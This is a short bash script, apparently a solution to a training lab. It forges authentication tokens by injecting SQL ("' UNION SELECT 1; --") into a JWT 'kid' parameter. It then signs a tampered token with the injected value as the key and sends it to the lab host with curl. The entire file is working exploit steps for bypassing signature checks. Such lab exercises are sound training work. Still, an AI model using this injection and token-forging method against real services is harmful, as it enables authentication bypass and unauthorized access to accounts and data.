#!/bin/bash

# try a request with the original auth cookie
curl -i -k -X GET -b "auth=$(cat token.txt)" 'http://ptl-be8125b2-edc9e13d.libcurl.so/'

# fuzz the kid parameter, looking for SQLi
bash fuzz.sh "sdfghdfg' UNION SELECT 1; --"

# no error, but the signature is invalid => the injection succeeded!
# the value selected from the DB is "1", we can use it to sign the data:
python sign.py 1 | (echo -n '.' && cat) | cat data.txt - > token.evil.txt

# send to the server
curl -i -k -X GET -b "auth=$(cat token.evil.txt)" 'http://ptl-be8125b2-edc9e13d.libcurl.so/'
